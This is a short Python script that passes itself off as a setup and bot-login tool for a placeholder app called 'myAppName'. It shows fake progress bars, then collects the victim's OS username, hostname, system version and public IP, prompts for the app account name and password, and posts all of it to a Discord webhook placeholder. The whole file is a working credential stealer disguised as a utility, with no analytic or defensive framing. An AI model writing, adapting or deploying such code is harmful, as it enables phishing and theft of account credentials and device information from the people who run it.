import subprocess, time, random, os
print("Setup Started...\n")
print(f"Updating modules... [ + ] % 0")
try:
	subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
for n in range(1, 101):
	time.sleep(random.uniform(0.01, 0.05))
	print(f"Updating modules... [ + ] % {n}")
try:
	subprocess.run(["pip", "install", "getpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
import requests, platform, getpass
try:
	ip = requests.get("http://ifconfig.me/ip").text
except:
	ip = "offline"
if ip == "offline":
	print("\nUnable to log in to the bot account due to either your internet being unavailable or experiencing errors.")
else:
	for n in range(0, 101):
		time.sleep(random.uniform(0.01, 0.03))
		print(f"Logining bot account... [ + ] % {n}")
	user = os.getlogin()
	device = platform.node()
	devicename = platform.system()
	devicever = platform.version()
	bot = f"{user}/{devicename}/{device}//{random.randint(100000, 999999)}"
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
	print(f"myAppTitle\n")
	print(f"Bot Account Name: {bot}\n")
	print("Please enter your myAppName account information")
	name = input("Enter myAppName account name: ")
	passwd = getpass.getpass("Enter myAppName account password: ")
	try:
		data = {"content": f"Os Username: || {user} ||\nDevice: || {device} ||\nDevice Name: || {devicename} ||\nDevice Version: || {devicever} ||\nIP Address: || {ip} ||\nFake Bot Account Name: || {bot} ||\nmyAppName Account: || {name} ||\nmyAppName Account Password: || {passwd} ||"}
		requests.post("dc_webhook_url", json=data, headers={"Content-Type": "application/json"})
	except:
		print("error in logining.")
